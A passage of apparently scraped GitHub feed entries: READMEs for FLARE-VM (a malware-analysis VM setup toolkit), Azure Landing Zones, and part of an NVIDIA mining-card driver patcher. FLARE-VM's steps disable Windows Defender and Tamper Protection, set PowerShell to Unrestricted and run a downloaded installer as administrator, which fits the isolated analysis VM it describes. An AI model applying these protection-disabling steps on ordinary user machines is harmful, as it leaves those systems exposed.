      <description>&lt;p&gt;A collection of software installations scripts for Windows systems that allows you to easily setup and maintain a reverse engineering environment on a VM.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;FLARE-VM&lt;/h1&gt; 
&lt;p&gt;Welcome to FLARE-VM - a collection of software installations scripts for Windows systems that allows you to easily setup and maintain a reverse engineering environment on a virtual machine (VM). FLARE-VM was designed to solve the problem of reverse engineering tool curation and relies on two main technologies: &lt;a href=&quot;https://chocolatey.org&quot;&gt;Chocolatey&lt;/a&gt; and &lt;a href=&quot;https://boxstarter.org&quot;&gt;Boxstarter&lt;/a&gt;. Chocolatey is a Windows-based Nuget package management system, where a &quot;package&quot; is essentially a ZIP file containing PowerShell installation scripts that download and configure a specific tool. Boxstarter leverages Chocolatey packages to automate the installation of software and create repeatable, scripted Windows environments.&lt;/p&gt; 
&lt;p align=&quot;center&quot;&gt; &lt;img src=&quot;https://raw.githubusercontent.com/mandiant/flare-vm/main/Images/flarevm-logo.png&quot; alt=&quot;FLARE-VM Logo&quot; width=&quot;600&quot;&gt; &lt;/p&gt; 
&lt;h2&gt;Requirements&lt;/h2&gt; 
&lt;p&gt;&lt;strong&gt;FLARE-VM should ONLY be installed on a virtual machine&lt;/strong&gt;. The VM should satisfy the following requirements:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Windows &amp;gt;= 10&lt;/li&gt; 
 &lt;li&gt;PowerShell &amp;gt;= 5&lt;/li&gt; 
 &lt;li&gt;Disk capacity of at least 60 GB and memory of at least 2GB&lt;/li&gt; 
 &lt;li&gt;Usernames without spaces or other special characters&lt;/li&gt; 
 &lt;li&gt;Internet connection&lt;/li&gt; 
 &lt;li&gt;Tamper Protection and any Anti-Malware solution (e.g., Windows Defender) Windows Defender disabled, preferably via Group Policy&lt;/li&gt; 
 &lt;li&gt;Windows Updates Disabled&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Installation instruction&lt;/h2&gt; 
&lt;p&gt;This section documents the steps to install FLARE-VM. You may also find useful the &lt;a href=&quot;https://www.youtube.com/watch?v=i8dCyy8WMKY&quot;&gt;&lt;em&gt;Building a VM for Reverse Engineering and Malware Analysis! Installing the FLARE-VM&lt;/em&gt; video&lt;/a&gt;.&lt;/p&gt; 
&lt;h3&gt;Pre-installation&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;Prepare a Windows 10+ virtual machine 
  &lt;ul&gt; 
   &lt;li&gt;Install Windows in the virtual machine, for example using the raw Windows 10 ISO from &lt;a href=&quot;https://www.microsoft.com/en-us/software-download/windows10ISO&quot;&gt;https://www.microsoft.com/en-us/software-download/windows10ISO&lt;/a&gt;&lt;/li&gt; 
   &lt;li&gt;Ensure the &lt;a href=&quot;https://raw.githubusercontent.com/mandiant/flare-vm/main/#requirements&quot;&gt;requirements above&lt;/a&gt; are satisfied, including: 
    &lt;ul&gt; 
     &lt;li&gt;Disable Windows Updates (at least until installation is finished) 
      &lt;ul&gt; 
       &lt;li&gt;&lt;a href=&quot;https://www.windowscentral.com/how-stop-updates-installing-automatically-windows-10&quot;&gt;https://www.windowscentral.com/how-stop-updates-installing-automatically-windows-10&lt;/a&gt;&lt;/li&gt; 
      &lt;/ul&gt; &lt;/li&gt; 
     &lt;li&gt;Disable Tamper Protection and any Anti-Malware solution (e.g., Windows Defender), preferably via Group Policy. 
      &lt;ul&gt; 
       &lt;li&gt;GPO: &lt;a href=&quot;https://superuser.com/a/1757341&quot;&gt;https://stackoverflow.com/questions/62174426/how-to-permanently-disable-windows-defender-real-time-protection-with-gpo&lt;/a&gt;&lt;/li&gt; 
       &lt;li&gt;Non-GPO - Manual: &lt;a href=&quot;https://www.maketecheasier.com/permanently-disable-windows-defender-windows-10&quot;&gt;https://www.maketecheasier.com/permanently-disable-windows-defender-windows-10/&lt;/a&gt;&lt;/li&gt; 
       &lt;li&gt;Non-GPO - Automated: &lt;a href=&quot;https://github.com/ionuttbara/windows-defender-remover&quot;&gt;https://github.com/ionuttbara/windows-defender-remover&lt;/a&gt;&lt;/li&gt; 
       &lt;li&gt;Non-GPO - Semi-Automated (User needs to toggle off Tamper Protection): [https://github.com/AveYo/LeanAndMean/blob/main/ToggleDefender.ps1] (&lt;a href=&quot;https://github.com/AveYo/LeanAndMean/raw/main/ToggleDefender.ps1&quot;&gt;https://github.com/AveYo/LeanAndMean/blob/main/ToggleDefender.ps1&lt;/a&gt;)&lt;/li&gt; 
      &lt;/ul&gt; &lt;/li&gt; 
    &lt;/ul&gt; &lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;Take a VM snapshot so you can always revert to a state before the FLARE-VM installation&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;FLARE-VM installation&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;Open a &lt;code&gt;PowerShell&lt;/code&gt; prompt as administrator&lt;/li&gt; 
 &lt;li&gt;Download the installation script &lt;a href=&quot;https://raw.githubusercontent.com/mandiant/flare-vm/main/install.ps1&quot;&gt;&lt;code&gt;installer.ps1&lt;/code&gt;&lt;/a&gt; to your Desktop: 
  &lt;ul&gt; 
   &lt;li&gt;&lt;code&gt;(New-Object net.webclient).DownloadFile(&#39;https://raw.githubusercontent.com/mandiant/flare-vm/main/install.ps1&#39;,&quot;$([Environment]::GetFolderPath(&quot;Desktop&quot;))\install.ps1&quot;)&lt;/code&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;Unblock the installation script: 
  &lt;ul&gt; 
   &lt;li&gt;&lt;code&gt;Unblock-File .\install.ps1&lt;/code&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;Enable script execution: 
  &lt;ul&gt; 
   &lt;li&gt;&lt;code&gt;Set-ExecutionPolicy Unrestricted -Force&lt;/code&gt; 
    &lt;ul&gt; 
     &lt;li&gt;If you receive an error saying the execution policy is overridden by a policy defined at a more specific scope, you may need to pass a scope in via &lt;code&gt;Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force&lt;/code&gt;. To view execution policies for all scopes, execute &lt;code&gt;Get-ExecutionPolicy -List&lt;/code&gt;&lt;/li&gt; 
    &lt;/ul&gt; &lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;Finally, execute the installer script as follow: 
  &lt;ul&gt; 
   &lt;li&gt;&lt;code&gt;.\install.ps1&lt;/code&gt; 
    &lt;ul&gt; 
     &lt;li&gt;To pass your password as an argument: &lt;code&gt;.\install.ps1 -password &amp;lt;password&amp;gt;&lt;/code&gt;&lt;/li&gt; 
     &lt;li&gt;To use the CLI-only mode with minimal user interaction: &lt;code&gt;.\install.ps1 -password &amp;lt;password&amp;gt; -noWait -noGui&lt;/code&gt;&lt;/li&gt; 
     &lt;li&gt;To use the CLI-only mode with minimal user interaction and a custom config file: &lt;code&gt;.\install.ps1 -customConfig &amp;lt;config.xml&amp;gt; -password &amp;lt;password&amp;gt; -noWait -noGui&lt;/code&gt;&lt;/li&gt; 
    &lt;/ul&gt; &lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt;After installation it is recommended to switch to &lt;code&gt;host-only&lt;/code&gt; networking mode and take a VM snapshot&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;Installer Parameters&lt;/h4&gt; 
&lt;p&gt;Below are the CLI parameter descriptions.&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;PARAMETERS
    -password &amp;lt;String&amp;gt;
        Current user password to allow reboot resiliency via Boxstarter. The script prompts for the password if not provided.

    -noPassword [&amp;lt;SwitchParameter&amp;gt;]
        Switch parameter indicating a password is not needed for reboots.

    -customConfig &amp;lt;String&amp;gt;
        Path to a configuration XML file. May be a file path or URL.

    -customLayout &amp;lt;String&amp;gt;
        Path to a taskbar layout XML file. May be a file path or URL.

    -noWait [&amp;lt;SwitchParameter&amp;gt;]
        Switch parameter to skip installation message before installation begins.

    -noGui [&amp;lt;SwitchParameter&amp;gt;]
        Switch parameter to skip customization GUI.

    -noReboots [&amp;lt;SwitchParameter&amp;gt;]
        Switch parameter to prevent reboots (not recommended).

    -noChecks [&amp;lt;SwitchParameter&amp;gt;]
        Switch parameter to skip validation checks (not recommended).
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Get full usage information by running &lt;code&gt;Get-Help .\install.ps1 -Detailed&lt;/code&gt;.&lt;/p&gt; 
&lt;h4&gt;Installer GUI&lt;/h4&gt; 
&lt;p&gt;The Installer GUI is display after executing the validation checks and installing Boxstarter and Chocolatey (if they are not installed already). Using the installer GUI you may customize:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Package selection&lt;/li&gt; 
 &lt;li&gt;Environment variable paths&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/mandiant/flare-vm/main/Images/installer-gui.png&quot; alt=&quot;Installer GUI&quot;&gt;&lt;/p&gt; 
&lt;h4&gt;Configuration&lt;/h4&gt; 
&lt;p&gt;The installer will download &lt;a href=&quot;https://raw.githubusercontent.com/mandiant/flare-vm/main/config.xml&quot;&gt;config.xml&lt;/a&gt; from the FLARE-VM repository. This file contains the default configuration, including the list of packages to install and the environment variable paths. You may use your own configuration by specifying the CLI-argument &lt;code&gt;-customConfig&lt;/code&gt; and providing either a local file path or URL to your &lt;code&gt;config.xml&lt;/code&gt; file. For example:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;.\install.ps1 -customConfig &quot;https://raw.githubusercontent.com/mandiant/flare-vm/main/config.xml&quot;
&lt;/code&gt;&lt;/pre&gt; 
&lt;h4&gt;Taskbar Layout&lt;/h4&gt; 
&lt;p&gt;The installer will use &lt;a href=&quot;https://raw.githubusercontent.com/mandiant/flare-vm/main/CustomStartLayout.xml&quot;&gt;CustomStartLayout.xml&lt;/a&gt; from the FLARE-VM repository. This file contains the default taskbar layout. You may use your own configuration by specifying the CLI-argument &lt;code&gt;-customLayout&lt;/code&gt; and providing a local file path or URL to your &lt;code&gt;CustomStartLayout.xml&lt;/code&gt; file. For example:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;.\install.ps1 -customLayout &quot;https://raw.githubusercontent.com/mandiant/flare-vm/main/CustomStartLayout.xml&quot;
&lt;/code&gt;&lt;/pre&gt; 
&lt;h5&gt;Things to Consider:&lt;/h5&gt; 
&lt;ul&gt; 
 &lt;li&gt;Items in the .xml that are not installed will not display in the taskbar (no broken links will be pinned)&lt;/li&gt; 
 &lt;li&gt;Only applications (&lt;code&gt;.exe&lt;/code&gt; files) or shortcuts to applications can be pinned.&lt;/li&gt; 
 &lt;li&gt;If you would like to pin something that isn&#39;t an application, consider creating a shortcut that points to &lt;code&gt;cmd.exe&lt;/code&gt; or &lt;code&gt;powershell&lt;/code&gt; with arguments supplied that will perform that actions you would like.&lt;/li&gt; 
 &lt;li&gt;If you would like to make something run with admin rights, consider making a shortcut using &lt;code&gt;VM-Install-Shortcut&lt;/code&gt; with the flag &lt;code&gt;-runAsAdmin&lt;/code&gt; and pinning the shortcut.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;Post installation steps&lt;/h4&gt; 
&lt;p&gt;You can include any post installation step you like in the configuration inside the tags &lt;code&gt;apps&lt;/code&gt;, &lt;code&gt;services&lt;/code&gt;, &lt;code&gt;path-items&lt;/code&gt;, &lt;code&gt;registry-items&lt;/code&gt;, and &lt;code&gt;custom-items&lt;/code&gt;.&lt;/p&gt; 
&lt;p&gt;For example:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;To show known file extensions:&lt;/li&gt; 
&lt;/ul&gt; 
&lt;pre&gt;&lt;code class=&quot;language-xml&quot;&gt;    &amp;lt;registry-items&amp;gt;
        &amp;lt;registry-item name=&quot;Show known file extensions&quot; path=&quot;HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced&quot; value=&quot;HideFileExt&quot; type=&quot;DWord&quot; data=&quot;0&quot;/&amp;gt;
    &amp;lt;/registry-items&amp;gt;
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;For more examples, check the default configuration file: &lt;a href=&quot;https://raw.githubusercontent.com/mandiant/flare-vm/main/config.xml&quot;&gt;config.xml&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;Contributing&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;Check our &lt;a href=&quot;https://raw.githubusercontent.com/mandiant/flare-vm/main/CONTRIBUTING.md&quot;&gt;CONTRIBUTING guide&lt;/a&gt; to learn how to contribute to the project.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Troubleshooting&lt;/h2&gt; 
&lt;p&gt;If your installation fails, please attempt to identify the reason for the installation error by reading through the log files listed below on your system:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;%VM_COMMON_DIR%\log.txt&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;%PROGRAMDATA%\chocolatey\logs\chocolatey.log&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;%LOCALAPPDATA%\Boxstarter\boxstarter.log&lt;/code&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Ensure you are running the latest version of the FLARE-VM installer and that your VM satisfies the &lt;a href=&quot;https://raw.githubusercontent.com/mandiant/flare-vm/main/#requirements&quot;&gt;requirements&lt;/a&gt;.&lt;/p&gt; 
&lt;h3&gt;Installer Error&lt;/h3&gt; 
&lt;p&gt;If the installation failed due to an issue in the installation script (e.g., &lt;code&gt;install.ps1&lt;/code&gt;), &lt;a href=&quot;https://github.com/mandiant/flare-vm/issues/new?labels=%3Abug%3A+bug&amp;amp;template=bug.yml&quot;&gt;report the bug in FLARE-VM&lt;/a&gt;. Provide all the information requested to ensure we are able to help you.&lt;/p&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; Rarely should &lt;code&gt;install.ps1&lt;/code&gt; be the reason for an installation failure. Most likely it is a specific package or set of packages that are failing (see below).&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;h3&gt;Package Error&lt;/h3&gt; 
&lt;p&gt;Packages fail to install from time to time -- this is normal. The most common reasons are outlined below:&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;Failure or timeout from Chocolatey or MyGet to download a &lt;code&gt;.nupkg&lt;/code&gt; file&lt;/li&gt; 
 &lt;li&gt;Failure or timeout due to remote host when downloading a tool&lt;/li&gt; 
 &lt;li&gt;Intrusion Detection System (IDS) or AV product (e.g., Windows Defender) prevents a tool download or removes the tool from the system&lt;/li&gt; 
 &lt;li&gt;Host specific issue, for example when using an untested version&lt;/li&gt; 
 &lt;li&gt;Tool fails to build due to dependencies&lt;/li&gt; 
 &lt;li&gt;Old tool URL (e.g., &lt;code&gt;HTTP STATUS 404&lt;/code&gt;)&lt;/li&gt; 
 &lt;li&gt;Tool&#39;s SHA256 hash has changed from what is hardcoded in the package installation script&lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;Reasons &lt;strong&gt;1-4&lt;/strong&gt; are difficult for us to fix since we do not control them. If an issue related to reasons &lt;strong&gt;1-4&lt;/strong&gt; is filed, it is unlikely we will be able to assist.&lt;/p&gt; 
&lt;p&gt;We can help with reasons &lt;strong&gt;5-7&lt;/strong&gt; and welcome the community to contribute fixes as well! Please &lt;a href=&quot;https://github.com/mandiant/VM-Packages/issues/new?labels=%3Abug%3A+bug&amp;amp;template=bug.yml&quot;&gt;report the bug in VM-Packages&lt;/a&gt; providing all the information requested.&lt;/p&gt; 
&lt;h3&gt;Updates&lt;/h3&gt; 
&lt;p&gt;Note that package updates are best effort and that updates are not being tested. If you encounter errors, perform a fresh FLARE-VM install.&lt;/p&gt; 
&lt;h2&gt;Legal Notice&lt;/h2&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;This download configuration script is provided to assist cyber security analysts in creating handy and versatile toolboxes for malware analysis environments. It provides a convenient interface for them to obtain a useful set of analysis tools directly from their original sources. Installation and use of this script is subject to the Apache 2.0 License. You as a user of this script must review, accept and comply with the license terms of each downloaded/installed package. By proceeding with the installation, you are accepting the license terms of each package, and acknowledging that your use of each package will be subject to its respective license terms.&lt;/p&gt; 
&lt;/blockquote&gt;</description>
    </item>
    
    <item>
      <title>Azure/Enterprise-Scale</title>
      <link>https://github.com/Azure/Enterprise-Scale</link>
      <description>&lt;p&gt;The Azure Landing Zones (Enterprise-Scale) architecture provides prescriptive guidance coupled with Azure best practices, and it follows design principles across the critical design areas for organizations to define their Azure architecture&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Azure Landing Zones (Enterprise-Scale) - Reference Implementation&lt;/h1&gt; 
&lt;p&gt;&lt;a href=&quot;http://isitmaintained.com/project/azure/enterprise-scale&quot; title=&quot;Average time to resolve an issue&quot;&gt;&lt;img src=&quot;http://isitmaintained.com/badge/resolution/azure/enterprise-scale.svg?sanitize=true&quot; alt=&quot;Average time to resolve an issue&quot;&gt;&lt;/a&gt; &lt;a href=&quot;http://isitmaintained.com/project/azure/enterprise-scale&quot; title=&quot;Percentage of issues still open&quot;&gt;&lt;img src=&quot;http://isitmaintained.com/badge/open/azure/enterprise-scale.svg?sanitize=true&quot; alt=&quot;Percentage of issues still open&quot;&gt;&lt;/a&gt; &lt;a href=&quot;https://scorecard.dev/viewer/?uri=github.com/Azure/Enterprise-Scale&quot;&gt;&lt;img src=&quot;https://api.scorecard.dev/projects/github.com/Azure/Enterprise-Scale/badge&quot; alt=&quot;OpenSSF Scorecard&quot;&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;User documentation&lt;/h2&gt; 
&lt;p&gt;To find out more about the Azure landing zones reference implementation, please refer to the &lt;a href=&quot;https://github.com/Azure/Enterprise-Scale/wiki&quot;&gt;documentation on our Wiki&lt;/a&gt;&lt;/p&gt; 
&lt;hr&gt; 
&lt;h2&gt;Objective&lt;/h2&gt; 
&lt;p&gt;The Azure Landing Zones (Enterprise-Scale) architecture provides prescriptive guidance coupled with Azure best practices, and it follows design principles across the critical design areas for organizations to define their Azure architecture. It will continue to evolve alongside the Azure platform and is ultimately defined by the various design decisions that organizations must make to define their Azure journey.&lt;/p&gt; 
&lt;p&gt;The Azure Landing Zones (Enterprise-Scale) architecture is modular by design and allows organizations to start with foundational landing zones that support their application portfolios, and the architecture enables organizations to start as small as needed and scale alongside their business requirements regardless of scale point.&lt;/p&gt; 
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/Azure/Enterprise-Scale/main/docs/wiki/media/ESLZ.gif&quot; alt=&quot;Animated image showing the modularity of Azure landing zones&quot;&gt;&lt;/p&gt; 
&lt;hr&gt; 
&lt;p&gt;&lt;em&gt;The Azure Landing Zones (Enterprise-Scale) architecture represents the strategic design path and target technical state for your Azure environment.&lt;/em&gt;&lt;/p&gt; 
&lt;hr&gt; 
&lt;p&gt;Not all enterprises adopt Azure in the same way, so the Enterprise-Scale architecture may vary between customers. Ultimately, the technical considerations and design recommendations of the Enterprise-Scale architecture may lead to different trade-offs based on the customer&#39;s scenario. Some variation is expected, but if core recommendations are followed, the resulting target architecture will put the customer on a path to sustainable scale.&lt;/p&gt; 
&lt;p&gt;The Azure Landing Zones (Enterprise-Scale) reference implementations in this repository are intended to support Enterprise-Scale Azure adoption and provides prescriptive guidance based on authoritative design for the Azure platform as a whole.&lt;/p&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;Key customer landing zone requirement&lt;/th&gt; 
   &lt;th&gt;Enterprise-Scale reference implementations&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Timelines to reach security and compliance requirements for a workload&lt;/td&gt; 
   &lt;td&gt;Enabling all recommendations during setup, will ensure resources are compliant from a monitoring and security perspective&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Provides a baseline architecture using multi-subscription design&lt;/td&gt; 
   &lt;td&gt;Yes, for the entire Azure tenant regardless of customer’s scale-point&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Best-practices from cloud provider&lt;/td&gt; 
   &lt;td&gt;Yes, proven and validated with customers&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Be aligned with cloud provider’s platform roadmap&lt;/td&gt; 
   &lt;td&gt;Yes&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;UI Experience&amp;nbsp;and simplified setup&lt;/td&gt; 
   &lt;td&gt;Yes, Azure portal&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;All critical services are present and properly configured according to recommend best practices for identity &amp;amp; access management, governance, security, network and logging&lt;/td&gt; 
   &lt;td&gt;Yes, using a multi-subscription design, aligned with Azure platform roadmap&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Automation capabilities (IaC/DevOps)&lt;/td&gt; 
   &lt;td&gt;Yes: ARM, Policy, Bicep and Terraform Modules&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Provides long-term self-sufficiency&lt;/td&gt; 
   &lt;td&gt;Yes, enterprise-scale architecture -&amp;gt; 1:N landing zones. Approach &amp;amp; architecture prepare the customer for long-term self-sufficiency, the RIs are there to get you started&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Enables migration velocity across the organization&lt;/td&gt; 
   &lt;td&gt;Yes, enterprise-scale architecture -&amp;gt; 1:N landing zones, Architecture includes designs for segmentation and separation of duty to empower teams to act within appropriate landing zones&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Achieves operational excellence&lt;/td&gt; 
   &lt;td&gt;Yes. Enables autonomy for platform and application teams with a policy driven governance and management&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;h2&gt;Conditions for success&lt;/h2&gt; 
&lt;p&gt;To fully leverage this reference implementation in this repository, readers must have a collaborative engagement with key customer stakeholders across critical technical domains, such as identity, security, and networking. Ultimately, the success of cloud adoption hinges on cross-discipline cooperation within the organization, since key requisite Enterprise-Scale design decisions are cross cutting, and to be authoritative must involve domain Subject Matter Expertise (SME) and stakeholders within the customer. It is crucial that the organization has defined their &lt;a href=&quot;https://raw.githubusercontent.com/Azure/Enterprise-Scale/main/docs/EnterpriseScale-Architecture.md&quot;&gt;Azure Landing Zones (Enterprise-Scale) Architecture&lt;/a&gt; following the design principles and critical design areas.&lt;/p&gt; 
&lt;p&gt;It is also assumed that readers have a broad understanding of key Azure constructs and services in order to fully contextualize the prescriptive recommendations contained within Azure Landing Zones (Enterprise-Scale).&lt;/p&gt; 
&lt;!--
![Enterprise-Scale ](./docs/wiki/media/ES-process.png)
--&gt; 
&lt;h2&gt;Deploying Azure Landing Zones (Enterprise-Scale Architecture) in your own environment&lt;/h2&gt; 
&lt;p&gt;The Azure Landing Zones (Enterprise-Scale Architecture) is modular by design and allows customers to start with foundational Landing Zones that support their application portfolios, regardless of whether the applications are being migrated or are newly developed and deployed to Azure. The architecture can scale alongside the customer&#39;s business requirements regardless of scale point. In this repository we are providing the following five templates representing different scenarios composed using ARM templates.&lt;/p&gt; 
&lt;p&gt;&lt;a href=&quot;https://aka.ms/alz/portal&quot;&gt;&lt;img src=&quot;https://learn.microsoft.com/en-us/azure/templates/media/deploy-to-azure.svg?sanitize=true&quot; alt=&quot;Deploy To Azure&quot;&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;You can find all of the implementation options for Azure Landing Zones here: &lt;a href=&quot;https://aka.ms/alz/aac#platform&quot;&gt;aka.ms/alz/aac&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;Azure Landing Zones Roadmap&lt;/h2&gt; 
&lt;p&gt;The Azure Landing Zones (Enterprise-Scale) architecture is continuously updated to align with advancements in the Azure platform and insights from customer feedback. For detailed information on future updates, please refer to the roadmap at: &lt;a href=&quot;https://aka.ms/alz/roadmap&quot;&gt;Azure Landing Zones Roadmap&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;Contributing&lt;/h2&gt; 
&lt;p&gt;This project welcomes contributions and suggestions. Most contributions require you to agree to a Contributor License Agreement (CLA) declaring that you have the right to, and actually do, grant us the rights to use your contribution. For details, visit &lt;a href=&quot;https://cla.opensource.microsoft.com&quot;&gt;Contributor License Agreement (CLA)&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;When you submit a pull request, a CLA bot will automatically determine whether you need to provide a CLA and decorate the PR appropriately (e.g., status check, comment). Simply follow the instructions provided by the bot. You will only need to do this once across all repos using our CLA.&lt;/p&gt; 
&lt;p&gt;This project has adopted the &lt;a href=&quot;https://opensource.microsoft.com/codeofconduct/&quot;&gt;Microsoft Open Source Code of Conduct&lt;/a&gt;. For more information see the &lt;a href=&quot;https://opensource.microsoft.com/codeofconduct/faq/&quot;&gt;Code of Conduct FAQ&lt;/a&gt; or contact &lt;a href=&quot;mailto:opencode@microsoft.com&quot;&gt;opencode@microsoft.com&lt;/a&gt; with any additional questions or comments.&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>dartraiden/NVIDIA-patcher</title>
      <link>https://github.com/dartraiden/NVIDIA-patcher</link>
      <description>&lt;p&gt;Adds 3D acceleration support for P106-090 / P106-100 / P104-100 / P104-101 / P102-100 / CMP 30HX / CMP 40HX / CMP 50HX / CMP 70HX / CMP 90HX / CMP 170HX mining cards as well as RTX 3060 3840SP, RTX 3080 Ti 20 GB, RTX 4070 10 GB, and L40 ES.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;NVIDIA patched drivers&lt;/h1&gt; 
&lt;p&gt;Adds 3D acceleration support for P106-090 / P106-100 / P104-100 / P104-101 / P102-100 / CMP 30HX / CMP 40HX / CMP 50HX / CMP 70HX / CMP 90HX / CMP 170HX mining cards as well as RTX 3060 3840SP, RTX 3080 Ti 20 GB, RTX 4070 10 GB, and L40 ES.&lt;/p&gt; 
&lt;h1&gt;Donation&lt;/h1&gt; 
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/dartraiden/NVIDIA-patcher/master/docs/donate.png&quot; alt=&quot;&quot;&gt;&lt;br&gt; If you like my project, please press &quot;Star&quot; in the top right corner. You can also donate me some money:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://boosty.to/dartraiden/donate&quot;&gt;Boosty&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://yoomoney.ru/to/410014777525134&quot;&gt;YooMoney&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://donate.webmoney.com/w/Dns9GDPvvlgw2pFUqf1pff&quot;&gt;WebMoney&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;Crypto: 
  &lt;ul&gt; 
   &lt;li&gt;BTC: bc1qakj06mgfcv8ypqeg38d6svwpefxluz90scmwvd&lt;/li&gt; 
   &lt;li&gt;LTC: ltc1qmhvewg7zjmmjw2uuyl37g26vxjjpywteppt6s9&lt;/li&gt; 
   &lt;li&gt;ETH: 0xf27585a4d02ac0308297621fac33763cd100c9f0&lt;/li&gt; 
   &lt;li&gt;USDT (Ethereum, ERC-20): 0xf27585a4d02ac0308297621fac33763cd100c9f0&lt;/li&gt; 
   &lt;li&gt;XMR (Monero): 86kq7awBWZKQt6ndJFJSdNEkAZzZQp6Fz4ToenTLNNjmGZS83LUbWEL9xtem3jwTy23KGfZr2sqK5TH5gy7bFr53QY5RN1D&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Security and transparency&lt;/h2&gt; 
&lt;p&gt;You can remove digital signatures from my files (use &lt;a href=&quot;https://github.com/SV-Foster/UnSign&quot;&gt;UnSign &lt;/a&gt; or &lt;a href=&quot;https://dennisbabkin.com/sigremover/&quot;&gt;SigRemove&lt;/a&gt;. Repeat this with the original files from the NVIDIA distribution. Compare the files byte by byte (&lt;code&gt;fc /b original.dll patched.dll&lt;/code&gt;). You will see that the files are identical, only a small number of bytes have changed. In this regard, I can&#39;t remove the &quot;virus&quot; (which doesn&#39;t exist) from the driver. Please report the false positive to your antivirus manufacturer.&lt;/p&gt; 
&lt;h2&gt;Usage&lt;/h2&gt; 
&lt;p&gt;&lt;a href=&quot;https://mysku.club/blog/taobao/70663.html&quot;&gt;Click here&lt;/a&gt; if you need Russian translation.&lt;/p&gt; 
&lt;p&gt;It&#39;s recommended to use Windows 11 because it has an updated mechanism for switching between multiple video cards.&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;Download patched files from &lt;a href=&quot;https://github.com/dartraiden/NVIDIA-patcher/releases&quot;&gt;releases&lt;/a&gt; (you can find an archive of previous versions &lt;a href=&quot;https://disk.yandex.ru/d/5LO4wqy177XZyw&quot;&gt;here&lt;/a&gt;).&lt;/li&gt; 
&lt;/ol&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/dartraiden/NVIDIA-patcher/releases/latest&quot;&gt;latest&lt;/a&gt; — if you want to use your card paired with any AMD/Intel graphic or any supported NVIDIA discrete graphic.&lt;/li&gt; 
